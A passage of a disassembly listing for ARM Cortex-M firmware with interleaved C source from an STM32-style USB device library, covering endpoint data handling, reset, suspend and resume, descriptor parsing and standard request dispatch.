 800b2e8:	f001 fcee 	bl	800ccc8 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b2ec:	68f8      	ldr	r0, [r7, #12]
 800b2ee:	f001 f856 	bl	800c39e <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b2f2:	68fb      	ldr	r3, [r7, #12]
 800b2f4:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b2f8:	2b00      	cmp	r3, #0
 800b2fa:	d03a      	beq.n	800b372 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b2fc:	68f8      	ldr	r0, [r7, #12]
 800b2fe:	f7ff fe42 	bl	800af86 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b302:	68fb      	ldr	r3, [r7, #12]
 800b304:	2200      	movs	r2, #0
 800b306:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b30a:	e032      	b.n	800b372 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b30c:	7afb      	ldrb	r3, [r7, #11]
 800b30e:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b312:	b2db      	uxtb	r3, r3
 800b314:	4619      	mov	r1, r3
 800b316:	68f8      	ldr	r0, [r7, #12]
 800b318:	f000 f8f3 	bl	800b502 <USBD_CoreFindEP>
 800b31c:	4603      	mov	r3, r0
 800b31e:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b320:	7dfb      	ldrb	r3, [r7, #23]
 800b322:	2bff      	cmp	r3, #255	; 0xff
 800b324:	d025      	beq.n	800b372 <USBD_LL_DataInStage+0x15a>
 800b326:	7dfb      	ldrb	r3, [r7, #23]
 800b328:	2b00      	cmp	r3, #0
 800b32a:	d122      	bne.n	800b372 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b32c:	68fb      	ldr	r3, [r7, #12]
 800b32e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b332:	b2db      	uxtb	r3, r3
 800b334:	2b03      	cmp	r3, #3
 800b336:	d11c      	bne.n	800b372 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b338:	7dfa      	ldrb	r2, [r7, #23]
 800b33a:	68fb      	ldr	r3, [r7, #12]
 800b33c:	32ae      	adds	r2, #174	; 0xae
 800b33e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b342:	695b      	ldr	r3, [r3, #20]
 800b344:	2b00      	cmp	r3, #0
 800b346:	d014      	beq.n	800b372 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b348:	7dfa      	ldrb	r2, [r7, #23]
 800b34a:	68fb      	ldr	r3, [r7, #12]
 800b34c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b350:	7dfa      	ldrb	r2, [r7, #23]
 800b352:	68fb      	ldr	r3, [r7, #12]
 800b354:	32ae      	adds	r2, #174	; 0xae
 800b356:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b35a:	695b      	ldr	r3, [r3, #20]
 800b35c:	7afa      	ldrb	r2, [r7, #11]
 800b35e:	4611      	mov	r1, r2
 800b360:	68f8      	ldr	r0, [r7, #12]
 800b362:	4798      	blx	r3
 800b364:	4603      	mov	r3, r0
 800b366:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b368:	7dbb      	ldrb	r3, [r7, #22]
 800b36a:	2b00      	cmp	r3, #0
 800b36c:	d001      	beq.n	800b372 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b36e:	7dbb      	ldrb	r3, [r7, #22]
 800b370:	e000      	b.n	800b374 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b372:	2300      	movs	r3, #0
}
 800b374:	4618      	mov	r0, r3
 800b376:	3718      	adds	r7, #24
 800b378:	46bd      	mov	sp, r7
 800b37a:	bd80      	pop	{r7, pc}

0800b37c <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b37c:	b580      	push	{r7, lr}
 800b37e:	b084      	sub	sp, #16
 800b380:	af00      	add	r7, sp, #0
 800b382:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b384:	2300      	movs	r3, #0
 800b386:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b388:	687b      	ldr	r3, [r7, #4]
 800b38a:	2201      	movs	r2, #1
 800b38c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b390:	687b      	ldr	r3, [r7, #4]
 800b392:	2200      	movs	r2, #0
 800b394:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b398:	687b      	ldr	r3, [r7, #4]
 800b39a:	2200      	movs	r2, #0
 800b39c:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b39e:	687b      	ldr	r3, [r7, #4]
 800b3a0:	2200      	movs	r2, #0
 800b3a2:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b3a6:	687b      	ldr	r3, [r7, #4]
 800b3a8:	2200      	movs	r2, #0
 800b3aa:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b3ae:	687b      	ldr	r3, [r7, #4]
 800b3b0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3b4:	2b00      	cmp	r3, #0
 800b3b6:	d014      	beq.n	800b3e2 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b3b8:	687b      	ldr	r3, [r7, #4]
 800b3ba:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3be:	685b      	ldr	r3, [r3, #4]
 800b3c0:	2b00      	cmp	r3, #0
 800b3c2:	d00e      	beq.n	800b3e2 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b3c4:	687b      	ldr	r3, [r7, #4]
 800b3c6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3ca:	685b      	ldr	r3, [r3, #4]
 800b3cc:	687a      	ldr	r2, [r7, #4]
 800b3ce:	6852      	ldr	r2, [r2, #4]
 800b3d0:	b2d2      	uxtb	r2, r2
 800b3d2:	4611      	mov	r1, r2
 800b3d4:	6878      	ldr	r0, [r7, #4]
 800b3d6:	4798      	blx	r3
 800b3d8:	4603      	mov	r3, r0
 800b3da:	2b00      	cmp	r3, #0
 800b3dc:	d001      	beq.n	800b3e2 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b3de:	2303      	movs	r3, #3
 800b3e0:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b3e2:	2340      	movs	r3, #64	; 0x40
 800b3e4:	2200      	movs	r2, #0
 800b3e6:	2100      	movs	r1, #0
 800b3e8:	6878      	ldr	r0, [r7, #4]
 800b3ea:	f001 fbc3 	bl	800cb74 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b3ee:	687b      	ldr	r3, [r7, #4]
 800b3f0:	2201      	movs	r2, #1
 800b3f2:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b3f6:	687b      	ldr	r3, [r7, #4]
 800b3f8:	2240      	movs	r2, #64	; 0x40
 800b3fa:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b3fe:	2340      	movs	r3, #64	; 0x40
 800b400:	2200      	movs	r2, #0
 800b402:	2180      	movs	r1, #128	; 0x80
 800b404:	6878      	ldr	r0, [r7, #4]
 800b406:	f001 fbb5 	bl	800cb74 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b40a:	687b      	ldr	r3, [r7, #4]
 800b40c:	2201      	movs	r2, #1
 800b40e:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b410:	687b      	ldr	r3, [r7, #4]
 800b412:	2240      	movs	r2, #64	; 0x40
 800b414:	621a      	str	r2, [r3, #32]

  return ret;
 800b416:	7bfb      	ldrb	r3, [r7, #15]
}
 800b418:	4618      	mov	r0, r3
 800b41a:	3710      	adds	r7, #16
 800b41c:	46bd      	mov	sp, r7
 800b41e:	bd80      	pop	{r7, pc}

0800b420 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b420:	b480      	push	{r7}
 800b422:	b083      	sub	sp, #12
 800b424:	af00      	add	r7, sp, #0
 800b426:	6078      	str	r0, [r7, #4]
 800b428:	460b      	mov	r3, r1
 800b42a:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b42c:	687b      	ldr	r3, [r7, #4]
 800b42e:	78fa      	ldrb	r2, [r7, #3]
 800b430:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b432:	2300      	movs	r3, #0
}
 800b434:	4618      	mov	r0, r3
 800b436:	370c      	adds	r7, #12
 800b438:	46bd      	mov	sp, r7
 800b43a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b43e:	4770      	bx	lr

0800b440 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b440:	b480      	push	{r7}
 800b442:	b083      	sub	sp, #12
 800b444:	af00      	add	r7, sp, #0
 800b446:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b448:	687b      	ldr	r3, [r7, #4]
 800b44a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b44e:	b2db      	uxtb	r3, r3
 800b450:	2b04      	cmp	r3, #4
 800b452:	d006      	beq.n	800b462 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b454:	687b      	ldr	r3, [r7, #4]
 800b456:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b45a:	b2da      	uxtb	r2, r3
 800b45c:	687b      	ldr	r3, [r7, #4]
 800b45e:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b462:	687b      	ldr	r3, [r7, #4]
 800b464:	2204      	movs	r2, #4
 800b466:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b46a:	2300      	movs	r3, #0
}
 800b46c:	4618      	mov	r0, r3
 800b46e:	370c      	adds	r7, #12
 800b470:	46bd      	mov	sp, r7
 800b472:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b476:	4770      	bx	lr

0800b478 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b478:	b480      	push	{r7}
 800b47a:	b083      	sub	sp, #12
 800b47c:	af00      	add	r7, sp, #0
 800b47e:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b480:	687b      	ldr	r3, [r7, #4]
 800b482:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b486:	b2db      	uxtb	r3, r3
 800b488:	2b04      	cmp	r3, #4
 800b48a:	d106      	bne.n	800b49a <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b48c:	687b      	ldr	r3, [r7, #4]
 800b48e:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b492:	b2da      	uxtb	r2, r3
 800b494:	687b      	ldr	r3, [r7, #4]
 800b496:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b49a:	2300      	movs	r3, #0
}
 800b49c:	4618      	mov	r0, r3
 800b49e:	370c      	adds	r7, #12
 800b4a0:	46bd      	mov	sp, r7
 800b4a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4a6:	4770      	bx	lr

0800b4a8 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b4a8:	b580      	push	{r7, lr}
 800b4aa:	b082      	sub	sp, #8
 800b4ac:	af00      	add	r7, sp, #0
 800b4ae:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b4b0:	687b      	ldr	r3, [r7, #4]
 800b4b2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b4b6:	b2db      	uxtb	r3, r3
 800b4b8:	2b03      	cmp	r3, #3
 800b4ba:	d110      	bne.n	800b4de <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b4bc:	687b      	ldr	r3, [r7, #4]
 800b4be:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4c2:	2b00      	cmp	r3, #0
 800b4c4:	d00b      	beq.n	800b4de <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b4c6:	687b      	ldr	r3, [r7, #4]
 800b4c8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4cc:	69db      	ldr	r3, [r3, #28]
 800b4ce:	2b00      	cmp	r3, #0
 800b4d0:	d005      	beq.n	800b4de <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b4d2:	687b      	ldr	r3, [r7, #4]
 800b4d4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4d8:	69db      	ldr	r3, [r3, #28]
 800b4da:	6878      	ldr	r0, [r7, #4]
 800b4dc:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b4de:	2300      	movs	r3, #0
}
 800b4e0:	4618      	mov	r0, r3
 800b4e2:	3708      	adds	r7, #8
 800b4e4:	46bd      	mov	sp, r7
 800b4e6:	bd80      	pop	{r7, pc}

0800b4e8 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b4e8:	b480      	push	{r7}
 800b4ea:	b083      	sub	sp, #12
 800b4ec:	af00      	add	r7, sp, #0
 800b4ee:	6078      	str	r0, [r7, #4]
 800b4f0:	460b      	mov	r3, r1
 800b4f2:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b4f4:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b4f6:	4618      	mov	r0, r3
 800b4f8:	370c      	adds	r7, #12
 800b4fa:	46bd      	mov	sp, r7
 800b4fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b500:	4770      	bx	lr

0800b502 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b502:	b480      	push	{r7}
 800b504:	b083      	sub	sp, #12
 800b506:	af00      	add	r7, sp, #0
 800b508:	6078      	str	r0, [r7, #4]
 800b50a:	460b      	mov	r3, r1
 800b50c:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b50e:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b510:	4618      	mov	r0, r3
 800b512:	370c      	adds	r7, #12
 800b514:	46bd      	mov	sp, r7
 800b516:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b51a:	4770      	bx	lr

0800b51c <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b51c:	b580      	push	{r7, lr}
 800b51e:	b086      	sub	sp, #24
 800b520:	af00      	add	r7, sp, #0
 800b522:	6078      	str	r0, [r7, #4]
 800b524:	460b      	mov	r3, r1
 800b526:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b528:	687b      	ldr	r3, [r7, #4]
 800b52a:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b52c:	687b      	ldr	r3, [r7, #4]
 800b52e:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b530:	2300      	movs	r3, #0
 800b532:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b534:	68fb      	ldr	r3, [r7, #12]
 800b536:	885b      	ldrh	r3, [r3, #2]
 800b538:	b29a      	uxth	r2, r3
 800b53a:	68fb      	ldr	r3, [r7, #12]
 800b53c:	781b      	ldrb	r3, [r3, #0]
 800b53e:	b29b      	uxth	r3, r3
 800b540:	429a      	cmp	r2, r3
 800b542:	d920      	bls.n	800b586 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b544:	68fb      	ldr	r3, [r7, #12]
 800b546:	781b      	ldrb	r3, [r3, #0]
 800b548:	b29b      	uxth	r3, r3
 800b54a:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b54c:	e013      	b.n	800b576 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b54e:	f107 030a 	add.w	r3, r7, #10
 800b552:	4619      	mov	r1, r3
 800b554:	6978      	ldr	r0, [r7, #20]
 800b556:	f000 f81b 	bl	800b590 <USBD_GetNextDesc>
 800b55a:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b55c:	697b      	ldr	r3, [r7, #20]
 800b55e:	785b      	ldrb	r3, [r3, #1]
 800b560:	2b05      	cmp	r3, #5
 800b562:	d108      	bne.n	800b576 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b564:	697b      	ldr	r3, [r7, #20]
 800b566:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b568:	693b      	ldr	r3, [r7, #16]
 800b56a:	789b      	ldrb	r3, [r3, #2]
 800b56c:	78fa      	ldrb	r2, [r7, #3]
 800b56e:	429a      	cmp	r2, r3
 800b570:	d008      	beq.n	800b584 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b572:	2300      	movs	r3, #0
 800b574:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b576:	68fb      	ldr	r3, [r7, #12]
 800b578:	885b      	ldrh	r3, [r3, #2]
 800b57a:	b29a      	uxth	r2, r3
 800b57c:	897b      	ldrh	r3, [r7, #10]
 800b57e:	429a      	cmp	r2, r3
 800b580:	d8e5      	bhi.n	800b54e <USBD_GetEpDesc+0x32>
 800b582:	e000      	b.n	800b586 <USBD_GetEpDesc+0x6a>
          break;
 800b584:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b586:	693b      	ldr	r3, [r7, #16]
}
 800b588:	4618      	mov	r0, r3
 800b58a:	3718      	adds	r7, #24
 800b58c:	46bd      	mov	sp, r7
 800b58e:	bd80      	pop	{r7, pc}

0800b590 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b590:	b480      	push	{r7}
 800b592:	b085      	sub	sp, #20
 800b594:	af00      	add	r7, sp, #0
 800b596:	6078      	str	r0, [r7, #4]
 800b598:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b59a:	687b      	ldr	r3, [r7, #4]
 800b59c:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b59e:	683b      	ldr	r3, [r7, #0]
 800b5a0:	881a      	ldrh	r2, [r3, #0]
 800b5a2:	68fb      	ldr	r3, [r7, #12]
 800b5a4:	781b      	ldrb	r3, [r3, #0]
 800b5a6:	b29b      	uxth	r3, r3
 800b5a8:	4413      	add	r3, r2
 800b5aa:	b29a      	uxth	r2, r3
 800b5ac:	683b      	ldr	r3, [r7, #0]
 800b5ae:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b5b0:	68fb      	ldr	r3, [r7, #12]
 800b5b2:	781b      	ldrb	r3, [r3, #0]
 800b5b4:	461a      	mov	r2, r3
 800b5b6:	687b      	ldr	r3, [r7, #4]
 800b5b8:	4413      	add	r3, r2
 800b5ba:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b5bc:	68fb      	ldr	r3, [r7, #12]
}
 800b5be:	4618      	mov	r0, r3
 800b5c0:	3714      	adds	r7, #20
 800b5c2:	46bd      	mov	sp, r7
 800b5c4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5c8:	4770      	bx	lr

0800b5ca <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b5ca:	b480      	push	{r7}
 800b5cc:	b087      	sub	sp, #28
 800b5ce:	af00      	add	r7, sp, #0
 800b5d0:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b5d2:	687b      	ldr	r3, [r7, #4]
 800b5d4:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b5d6:	697b      	ldr	r3, [r7, #20]
 800b5d8:	781b      	ldrb	r3, [r3, #0]
 800b5da:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b5dc:	697b      	ldr	r3, [r7, #20]
 800b5de:	3301      	adds	r3, #1
 800b5e0:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b5e2:	697b      	ldr	r3, [r7, #20]
 800b5e4:	781b      	ldrb	r3, [r3, #0]
 800b5e6:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b5e8:	8a3b      	ldrh	r3, [r7, #16]
 800b5ea:	021b      	lsls	r3, r3, #8
 800b5ec:	b21a      	sxth	r2, r3
 800b5ee:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b5f2:	4313      	orrs	r3, r2
 800b5f4:	b21b      	sxth	r3, r3
 800b5f6:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b5f8:	89fb      	ldrh	r3, [r7, #14]
}
 800b5fa:	4618      	mov	r0, r3
 800b5fc:	371c      	adds	r7, #28
 800b5fe:	46bd      	mov	sp, r7
 800b600:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b604:	4770      	bx	lr
	...

0800b608 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b608:	b580      	push	{r7, lr}
 800b60a:	b084      	sub	sp, #16
 800b60c:	af00      	add	r7, sp, #0
 800b60e:	6078      	str	r0, [r7, #4]
 800b610:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b612:	2300      	movs	r3, #0
 800b614:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b616:	683b      	ldr	r3, [r7, #0]
 800b618:	781b      	ldrb	r3, [r3, #0]
 800b61a:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b61e:	2b40      	cmp	r3, #64	; 0x40
 800b620:	d005      	beq.n	800b62e <USBD_StdDevReq+0x26>
 800b622:	2b40      	cmp	r3, #64	; 0x40
 800b624:	d857      	bhi.n	800b6d6 <USBD_StdDevReq+0xce>
 800b626:	2b00      	cmp	r3, #0
 800b628:	d00f      	beq.n	800b64a <USBD_StdDevReq+0x42>
 800b62a:	2b20      	cmp	r3, #32
 800b62c:	d153      	bne.n	800b6d6 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b62e:	687b      	ldr	r3, [r7, #4]
 800b630:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b634:	687b      	ldr	r3, [r7, #4]
 800b636:	32ae      	adds	r2, #174	; 0xae
 800b638:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b63c:	689b      	ldr	r3, [r3, #8]
 800b63e:	6839      	ldr	r1, [r7, #0]
 800b640:	6878      	ldr	r0, [r7, #4]
 800b642:	4798      	blx	r3
 800b644:	4603      	mov	r3, r0
 800b646:	73fb      	strb	r3, [r7, #15]
      break;
 800b648:	e04a      	b.n	800b6e0 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b64a:	683b      	ldr	r3, [r7, #0]
 800b64c:	785b      	ldrb	r3, [r3, #1]
 800b64e:	2b09      	cmp	r3, #9
 800b650:	d83b      	bhi.n	800b6ca <USBD_StdDevReq+0xc2>
 800b652:	a201      	add	r2, pc, #4	; (adr r2, 800b658 <USBD_StdDevReq+0x50>)
 800b654:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b658:	0800b6ad 	.word	0x0800b6ad
 800b65c:	0800b6c1 	.word	0x0800b6c1
 800b660:	0800b6cb 	.word	0x0800b6cb
 800b664:	0800b6b7 	.word	0x0800b6b7
 800b668:	0800b6cb 	.word	0x0800b6cb
 800b66c:	0800b68b 	.word	0x0800b68b
 800b670:	0800b681 	.word	0x0800b681
 800b674:	0800b6cb 	.word	0x0800b6cb
 800b678:	0800b6a3 	.word	0x0800b6a3
 800b67c:	0800b695 	.word	0x0800b695
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b680:	6839      	ldr	r1, [r7, #0]
 800b682:	6878      	ldr	r0, [r7, #4]
 800b684:	f000 fa3c 	bl	800bb00 <USBD_GetDescriptor>
          break;
 800b688:	e024      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b68a:	6839      	ldr	r1, [r7, #0]
 800b68c:	6878      	ldr	r0, [r7, #4]
 800b68e:	f000 fbcb 	bl	800be28 <USBD_SetAddress>
          break;
 800b692:	e01f      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b694:	6839      	ldr	r1, [r7, #0]
 800b696:	6878      	ldr	r0, [r7, #4]
 800b698:	f000 fc0a 	bl	800beb0 <USBD_SetConfig>
 800b69c:	4603      	mov	r3, r0
 800b69e:	73fb      	strb	r3, [r7, #15]
          break;
 800b6a0:	e018      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b6a2:	6839      	ldr	r1, [r7, #0]
 800b6a4:	6878      	ldr	r0, [r7, #4]
 800b6a6:	f000 fcad 	bl	800c004 <USBD_GetConfig>
          break;
 800b6aa:	e013      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b6ac:	6839      	ldr	r1, [r7, #0]
 800b6ae:	6878      	ldr	r0, [r7, #4]
 800b6b0:	f000 fcde 	bl	800c070 <USBD_GetStatus>
          break;
 800b6b4:	e00e      	b.n	800b6d4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b6b6:	6839      	ldr	r1, [r7, #0]
 800b6b8:	6878      	ldr	r0, [r7, #4]
